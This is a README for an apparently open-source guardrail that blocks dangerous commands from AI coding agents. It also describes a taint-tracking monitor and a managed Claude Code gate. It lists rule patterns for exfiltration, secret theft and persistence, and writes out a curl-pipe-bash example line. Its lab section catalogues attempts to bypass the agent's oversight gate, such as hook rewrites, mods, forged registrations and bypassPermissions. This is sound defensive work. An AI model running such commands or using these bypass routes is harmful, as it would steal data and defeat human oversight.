# Barmkin

Regex guardrail for AI coding agents. Each tool call goes through `barmkin eval` before executing. If a rule matches, the command is blocked. Otherwise it passes silently.

Runs as a subprocess per invocation. Config is a YAML file of regex rules.

> **Successor fork.** This fork works toward a stateful barmkin successor. The legacy CLI (`barmkin eval`, installed by `install.sh`) is unchanged and works as described below. The [local monitor](#local-monitor-foundation) and the [Claude Code managed gate](#claude-code-managed-gate-demo) are a separate demo for a dedicated VM: `barmkin eval` does not use them, and `install.sh` does not set them up.

## Scope

Barmkin matches command strings. It does not read file contents or inspect command output. If you need semantic evaluation of what an agent writes or retrieves, use sondera, which adds Cedar policies and LLM classification on top.

## Why the name?

A barmkin is a Scottish defensive wall around a tower house. My friend Sam, who is very Scottish, tells me his ancestors built these to keep my ancestors out. I'm choosing to read that as a compliment about our taste in architecture, our shared desire to try deep-fried battered Mars bars, and our mutual appreciation of Buckfast.

Had this been a network service, it would have listened on port 1707. Sam will know why. I do like Sam.

## Install

```bash
go build -o barmkin .
sudo ./install.sh
```

This puts the binary in `~/.local/bin/`, the config in `/etc/barmkin/rules.yaml`, and registers hooks for both Claude Code and opencode.

### Claude Code

A PreToolUse hook in `~/.claude/settings.json` runs `barmkin eval` on every `Bash`, `Write`, `Edit`, `MultiEdit`, and `NotebookEdit` call. Exit 2 blocks and stderr goes to the LLM.

### opencode

The plugin at `plugins/barmkin.ts` spawns `barmkin eval` on every `tool.execute.before` event. Installed to `~/.config/opencode/plugins/`.

## Commands

```
barmkin eval       stdin in, exit 0 or exit 2
barmkin gate       managed Claude Code shim-presence check, exit 0 or exit 2
barmkin monitor    run the monitor service (see "Monitor core" below)
barmkin test       run deny/allow test vectors
barmkin validate   check config, rules, examples
barmkin stats      aggregate from log file
barmkin version
```

## Rules

45 rules across 9 categories. Every rule has an `example` field that `go test` verifies automatically. Adding a rule with an example adds a test.

| Category | Rules |
|----------|-------|
| Destructive | rm-rf, chmod 777, fork bomb, shutdown, kill -9 -1, shred, mkfs, dd, wipefs, redirect to device |
| Git | reset --hard, push --force, clean -fd, filter-branch |
| Database | TRUNCATE TABLE, DROP TABLE, DROP DATABASE, DELETE without WHERE |
| Exfiltration | curl\|bash, wget\|bash, scp ssh keys, curl upload, tar\|ssh, nc pipe, rsync remote |
| Supply chain | npm git+ install, pip untrusted URL |
| Obfuscation | base64+exec, eval hex |
| Secrets | AWS keys, private keys, GitHub/Slack/GitLab tokens, .env files |
| Persistence | authorized_keys, chown system, ssh tunnel, history clear |
| Container | docker prune --all, docker rm all, kubectl delete namespace |

## Adding rules

Edit `/etc/barmkin/rules.yaml`:

```yaml
- name: "my-rule"
  pattern: 'dangerous\s+command'
  secret: false                       # true: redact this rule's matches from the log
  action: "deny"                      # or "allow" to exempt the deny matches it covers
  reason: "Why it's blocked"
  example: "dangerous command --flag"  # must match, verified by tests
```

Run `barmkin validate` after editing.

### Allow rules

Setting `action: "allow"` on a rule exempts the deny matches that lie inside one of its own matches, regardless of ordering. Use this to exempt specific patterns:

```yaml
- name: "allow-tmp-rm"
  pattern: 'rm\s+-rf\s+/tmp/'
  action: "allow"

- name: "rm-rf-force"
  pattern: 'rm\s+-rf\b'
```

`rm -rf /tmp/build` passes. `rm -rf /home` does not.

An allow rule covers only the text it matches, not the whole command. `rm -rf /tmp/build; rm -rf ~` is still denied by the `rm -rf ~` part, and `rm -rf /tmp/x && curl http://example.com/p.sh | bash` is still denied by `curl-pipe-bash`. A deny match that only overlaps an allow match, rather than lying inside it, is also still denied. Earlier versions let any allow match clear every deny rule for the whole command. Configurations without allow rules behave as before.

## opencode env vars

| Variable | Default | Description |
|----------|---------|-------------|
| `BARMKIN_BIN` | `barmkin` | Binary path |
| `BARMKIN_TITLE` | `Barmkin` | Toast title (if toasts on) |
| `BARMKIN_TOAST` | `0` | `1` enables toast notifications |
| `BARMKIN_DRY_RUN` | `0` | `1` logs denials without blocking |
| `BARMKIN_OFF` | `0` | `1` disables the plugin |

## Logging

Each evaluation appends a JSON line to `~/.barmkin/barmkin.log`:

```json
{"ts":"2026-06-30T01:00:00Z","trajectory_id":"sess-123","tool":"bash","action":"ShellCommand","decision":"deny","reason":"Recursive force-delete","duration_ms":0.064,"rule":"rm-rf-force","content":"rm -rf /tmp","agent":"claude-code"}
```

`content` holds the first 80 characters of the command. Matches of any rule marked `secret: true` (in the bundled rules: AWS access keys, private key blocks, GitHub, Slack and GitLab tokens) are replaced with `[REDACTED:<rule>]` before the cut, so a blocked secret never reaches the log. `barmkin stats` aggregates. The format matches sondera's AuditEntry if you want to query both together.

## OpenTelemetry

Set `otel.endpoint` in rules.yaml to send one span per evaluation to an OTLP collector:

```yaml
otel:
  endpoint: "localhost:4317"
  service: "barmkin"
```

## Monitor core (`barmkin monitor`)

`barmkin monitor` is the successor's monitor service (`internal/monitor`). It serves the versioned shim-monitor contract in `internal/proto` (HTTP POST of JSON to `/v1/<op>` on a Unix socket) and keeps each session's taint in a crash-safe journal (`internal/journal`). No shim, gate or installer uses it yet; `barmkin eval`, `barmkin gate` and `install.sh` are unchanged.

```
barmkin monitor [-socket /run/barmkin/monitor.sock] [-state-dir /var/lib/barmkin]
                [-client-group barmkin-clients] [-preregister-ttl 10s]
```

**Deployment.** Root installs and manages the monitor, which runs as a dedicated service user, for example under a systemd unit with `User=`, `StateDirectory=` and `RuntimeDirectory=`. Root creates both directories. The monitor refuses to start when:
- it is running as root;
- the state directory is not owned by the service user with mode `0700` or tighter;
- the runtime directory is not owned by the service user with mode `0750` or tighter;
- any directory above either one is writable by someone other than root or the service user;
- a path component is a symlink.

The journal is `0600`. The socket is `0660`, group `barmkin-clients`. The service user and every user whose agents connect must be members of that group. The monitor reads each connection's peer credentials (`SO_PEERCRED`) and drops any connection it cannot identify. A client's uid is part of every session key, so one user cannot see or change another user's sessions.

**Sessions and taint.** Each session belongs to a root lineage, and the lineage holds two legs, untrusted and sensitive. Legs only rise, and the first source to raise a leg stays. There is no clear, rotate or capability operation.
- `register` refuses a host whose sandbox is off or allows every Unix socket (`posture_refused`).
- A new lineage starts clean only for a fresh top-level session. Any other new lineage starts with its untrusted leg raised by `unknown_session`.
- Every operation on an unregistered session fails with `unknown_session`, which clients treat as a deny.
- `decide` follows barmkin-mod's egress postures: the untrusted leg denies the deny classes and warns on the rest, both legs deny everything, and a clean session warns only on destructive classes.
- The core has no classifier. `screen` raises the untrusted leg for the content's source and answers `unavailable`.

**Screen service.** `internal/screen` is the Jev screen service the monitor will use, ported from barmkin-mod's TypeScript screen. The monitor core does not call it yet. It takes a shim's already-redacted classifier windows, the shim's local scores and the content's source. It returns pass, escalate or deny, with the composed scores, a closed reason code, a gap code and the legs the content raises. Jev can only raise a score, a failed window is never a pass, and content Jev could not fully read escalates with a gap.
- The Jev endpoint and credential belong to the monitor's own configuration, not a plugin's.
- Each endpoint has a breaker.
- Answers are cached for 24 hours in a bounded cache. Failures are never cached, the cache has no query endpoint, and the shadow screen uses its own namespace.
- Golden tests replay barmkin-mod's TypeScript against recorded mock Jev responses. No test calls Jev.

**Journal.** A leg raise or registration is fsynced before the request is answered. At every start the monitor replays the journal and rewrites it as a compact snapshot. If the last run did not stop cleanly (a crash, `SIGKILL`, a torn tail or a damaged record), every known lineage gets its untrusted leg raised by `monitor_restart`. A damaged journal is moved aside as `journal.damaged-<time>`, and only its valid records are replayed. A private regular journal that cannot be read or is over the size limit is moved aside the same way and every session starts unknown. A symlink, a non-regular file, or a journal with the wrong owner or mode is never moved, and the monitor refuses to start. A deleted journal leaves every session unknown, so it denies until it registers again. If a change cannot be journaled, `health` reports `degraded` and every other operation fails `unavailable`.

## Local monitor (foundation)

`cmd/barmkin-monitor` is a small local decision service for a future stateful barmkin. It is separate from `barmkin eval`. Only the Claude Code demo gate below calls it; `barmkin eval` and the default install do not.

It serves a versioned HTTP/JSON contract on a Unix socket (mode `0600`). Requests carry no tool content: only opaque session and tool-call tokens (`[A-Za-z0-9._-]{1,128}`) and values from closed enums. The typed definitions live in `monitor/api.go`.

| Endpoint | Request | Response |
|----------|---------|----------|
| `POST /v1/decide` | `{"version":1,"session":"s","operation":"routine"\|"protected"}` | `{"version":1,"decision":"allow"\|"deny","reason":"..."}` |
| `POST /v1/taint` | `{"version":1,"session":"s","source":"untrusted-input"}` | `{"version":1,"tainted":true\|false,"reason":"..."}` |
| `POST /v1/register` | `{"version":1,"session":"s","call":"c"}` | `{"version":1,"registered":true\|false,"reason":"..."}` |
| `POST /v1/presence` | `{"version":1,"session":"s","call":"c"}` | `{"version":1,"decision":"allow"\|"deny","reason":"..."}` |

Once a session is tainted, `protected` decisions in that session deny and `routine` ones still allow. There is no way to clear a taint yet; how a human clears one (or rotates to a new epoch) is still an open design choice.

`/v1/register` and `/v1/presence` back the Claude Code gate below. A registration is held in memory only, never journaled, and stays live for 10 seconds (`serve -presence-ttl`). A presence check allows only a live registration and consumes it, so each registration admits one call. An unregistered call denies with `unregistered`, an expired one with `expired`. Presence checks also deny while the monitor is refusing decisions after a journal failure. The monitor holds at most 4096 live registrations.

Failures deny:

- Invalid JSON, unknown or repeated keys, case-variant keys, trailing data, oversized bodies, the wrong method, an unsupported `version`, an unknown `operation` or `source`, and unknown paths all deny with a reason code.
- The client (`monitor.Client`, and the `decide` and `send` subcommands) treats anything other than an HTTP 200 carrying a well-formed v1 allow as a deny. If the monitor is unreachable, the result is `monitor-unavailable`.
- If a taint cannot be journaled, the monitor denies every later decision.

Taints are written to an append-only journal. Each record carries a CRC-32C checksum and is fsynced before the taint is acknowledged, so an acknowledged taint survives a crash or `SIGKILL`. On startup the monitor replays the journal and drops only an unterminated final fragment (an append that was interrupted before it was acknowledged). Any other damage stops the monitor from starting, and every client decision then denies. An exclusive `flock` keeps a second monitor off the same journal.

### Demo

```bash
./scripts/monitor-demo.sh     # or: make monitor-demo
```

The script builds `barmkin-monitor` into a temporary directory and starts it there. It checks clean-session allows, malformed and unknown requests, a taint through `/v1/taint`, a `SIGKILL` of the monitor (all decisions deny while it is down), and a restart in which the journaled taint still denies `protected`. It checks every exit code and reason and exits non-zero on the first surprise. `go test ./cmd/barmkin-monitor` runs the same script.

To drive it by hand:

```bash
go build -o /tmp/barmkin-monitor ./cmd/barmkin-monitor
/tmp/barmkin-monitor serve -socket /tmp/bm.sock -journal /tmp/bm.journal & sleep 1
/tmp/barmkin-monitor decide -socket /tmp/bm.sock -session s1 -operation protected   # exit 0, allow
/tmp/barmkin-monitor taint  -socket /tmp/bm.sock -session s1                         # exit 0, recorded
/tmp/barmkin-monitor decide -socket /tmp/bm.sock -session s1 -operation protected   # exit 2, tainted
/tmp/barmkin-monitor send   -socket /tmp/bm.sock -path /v1/decide -body '{"bad":1}'  # exit 2, malformed-request
kill -9 %1; /tmp/barmkin-monitor serve -socket /tmp/bm.sock -journal /tmp/bm.journal & sleep 1
/tmp/barmkin-monitor decide -socket /tmp/bm.sock -session s1 -operation protected   # exit 2, still tainted
```

## Claude Code managed gate (demo)

This is a minimal demo of strict per-call shim presence for a managed Claude Code seat, under the full managed lock. Two pieces run on every tool call:

- **Shim plugin** (`plugins/claude-code/barmkin-shim`). A hooks module (`hooks/register.ts`) on the `session.append` event. When the model's response is added to the conversation, it sends each tool call's `tool_use_id`, with the session id, to the monitor (`POST /v1/register`). That happens before Claude Code starts the call. The shim never blocks anything.
- **Managed gate** (`barmkin gate`). A PreToolUse hook in managed settings, so the user cannot remove it. It asks the monitor whether that exact call was registered (`POST /v1/presence`) and exits 0 only if it was.

A session without the shim, or with a broken one, can therefore run no tools. Both requests are versioned and content-free: they never carry the tool name, the tool input or the prompt.

The shim has to be a hooks module. Claude Code 2.1.x runs the managed PreToolUse hook before any plugin hook, and a managed deny is final. So a shim written as a plugin PreToolUse command hook never registers a call in time, and the gate denies every call. Managed `prependPlugins` also skips a plugin that has no hooks module. The live lab below shows both.

The shim's registration normally lands before the gate starts, but its request can still be in flight. So the gate keeps asking for up to 1.5 seconds while the answer is `unregistered`. Every other answer is final. The shim gives up on a registration after 1 second.

The gate exits 2, writing its reason and the v1 response to stderr, for any of these:

- `unregistered`: no shim registration, or one that was already used.
- `expired`: the registration is older than its TTL.
- `malformed-request`: the hook input has no well-formed `session_id` or `tool_use_id`, is not JSON, is over 64 MiB, or does not arrive within 1 second. A bad gate flag also gives this reason.
- `malformed-response`: anything other than an HTTP 200 carrying a well-formed v1 allow.
- `monitor-unavailable`: no socket is configured (`-socket`, or `BARMKIN_MONITOR_SOCKET`), or the monitor is unreachable or stalls past the 500 ms request timeout.
- `deadline-exceeded`: the gate hits its 3-second hard deadline.

A panic inside the gate also denies, with exit 2.

Claude Code treats a hook timeout, and any exit code other than 0 or 2, as a non-blocking error and runs the tool anyway. So the gate never exits with any other code, and its 3-second deadline sits well inside the 10-second hook timeout in the recipe. `go test` checks the shipped recipe against the deadline, and checks that it keeps the full lock.

This demo does not clear taints, rotate epochs or package anything, and it changes no host settings. The monitor socket is owner-only. Under the lock, sandboxed Bash commands cannot open it. Any other process running as the same user still can, so the demo does not stop such a process from forging a registration.

### Lab fixture

```bash
./scripts/claude-gate-demo.sh     # or: make claude-gate-demo
```

The script builds `barmkin` and `barmkin-monitor` into a temporary directory and starts the monitor there. For each simulated tool call it feeds one PreToolUse input to `barmkin gate`. When the shim is "loaded", the script registers the same call as the shim does (`barmkin-monitor send` to `/v1/register`), with the request still in flight as the gate starts. It checks every exit code and reason:

- Without the shim, a call is denied.
- With the shim, a call is allowed, and the same call replayed or sent from another session is denied.
- A shim pointed at the wrong socket gets its call denied.
- An expired registration, malformed hook input, a gate with no socket, and a `SIGKILL`ed monitor are all denied.
- After a restart, calls are allowed again.

`go test .` runs this script and the shim module's tests. To run the shim tests on their own, use `make shim-test`, or `node --test barmkin-shim.test.ts` in `plugins/claude-code`. They need Node 22.18+ or 23.6+, which run `.ts` files directly. The shim itself runs inside Claude Code and needs no Node.

### Live lab under the full lock

```bash
./scripts/claude-lock-lab.sh     # or: make claude-lock-lab, or BARMKIN_CLAUDE_LAB=1 go test -run TestClaudeLockLab .
```

The script runs about thirty real `claude -p` sessions (Claude Code 2.1.x) against a scripted local model. Each runs in a private mount namespace (bubblewrap) where the recipe's paths exist: the recipe itself at `/etc/claude-code/managed-settings.json`, unchanged, plus `/usr/local/bin/barmkin`, `/opt/barmkin/plugins/claude-code` and `/run/barmkin/monitor.sock`. It writes nothing outside a temporary directory. It needs `claude`, `go`, `node`, `bwrap`, `socat`, unprivileged user namespaces and an existing `/etc/claude-code` directory to mount over. If any is missing it exits 77.

It checks, under the full lock:

- Single, parallel and subagent tool calls are registered and allowed.
- None of these changes the command that runs: user, project, local and `--settings` PreToolUse hooks that rewrite it; a `--plugin-dir` or `CLAUDE_CODE_PLUGIN_DIRS` mod, or a user-installed plugin, that rewrites it and overturns the gate's re-check at `tool.check`; user settings that redefine the `barmkin-local` marketplace or disable the shim. The user hooks and mods are never loaded.
- A sandboxed command cannot reach the monitor socket to forge a registration.
- A plugin-state file that points the shim at a user-writable copy, and `--safe-mode`, stop the shim loading, so every call is denied.
- With the monitor down, every call is denied, including under `disableAllHooks`, `bypassPermissions` and `--bare`.

It also runs controls without the lock. There, the same hooks, mods and plugins do change the command that runs, and an unsandboxed command can register calls. A shim written as a plugin PreToolUse command hook gets every call denied, with or without the lock.

### Managed-settings recipe for the dedicated demo VM

These steps are for the dedicated demo VM only. Nothing in this repository applies them.

1. Install the sandbox helpers, the binaries and the plugin marketplace:

   ```bash
   sudo apt-get install -y bubblewrap socat
   go build -o barmkin . && go build -o barmkin-monitor ./cmd/barmkin-monitor
   sudo install -m 0755 barmkin barmkin-monitor /usr/local/bin/
   sudo mkdir -p /opt/barmkin/plugins && sudo cp -r plugins/claude-code /opt/barmkin/plugins/
   ```

2. Run the monitor as the demo user. The socket directory must belong to that user:

   ```bash
   sudo install -d -o "$USER" -m 0700 /run/barmkin
   barmkin-monitor serve -socket /run/barmkin/monitor.sock -journal ~/.barmkin/taint.journal
   ```

3. Install [`plugins/claude-code/managed-settings.example.json`](plugins/claude-code/managed-settings.example.json) as `/etc/claude-code/managed-settings.json` (owned by root, mode `0644`). It sets up the full lock:
   - `allowManagedHooksOnly: true`: only managed hooks and managed plugins' hooks modules run. User, project, local and `--settings` hooks, `--plugin-dir` mods and user-installed plugins are not loaded. This also switches off any other settings hooks on the VM.
   - `prependPlugins`: seats `barmkin-shim@barmkin-local` and then `cc-plugin-sec-default@builtin`. Keep the security default listed, by that exact id: leaving it out unseats it.
   - `extraKnownMarketplaces` and `enabledPlugins`: declare the local `barmkin-local` marketplace at `/opt/barmkin/plugins/claude-code` and turn on `barmkin-shim@barmkin-local`, which makes the shim a managed plugin.
   - `sandbox`: `enabled`, `failIfUnavailable` and `allowUnsandboxedCommands: false`, with `bwrapPath` and `socatPath` pinned to `/usr/bin` (only managed settings can set these). Sandboxed commands cannot open the monitor socket. Never set `network.allowAllUnixSockets`.
   - `hooks.PreToolUse`: the gate with matcher `*`, `-socket /run/barmkin/monitor.sock`, and `timeout: 10` (seconds).
   - `env.BARMKIN_MONITOR_SOCKET`: tells the shim where the monitor is.

4. Start `claude` as the demo user and confirm that tool calls run. To see the deny path, stop the monitor, or set `enabledPlugins."barmkin-shim@barmkin-local"` to `false` in the managed settings. Every tool call is then denied with the reason from the gate. Turning the shim off in user settings does not work: the managed setting wins.

The lock holds against the demo user's own settings, mods and plugins. It does not hold against root, who can rewrite the managed settings.

`claude plugin validate plugins/claude-code` checks the marketplace and plugin manifests.
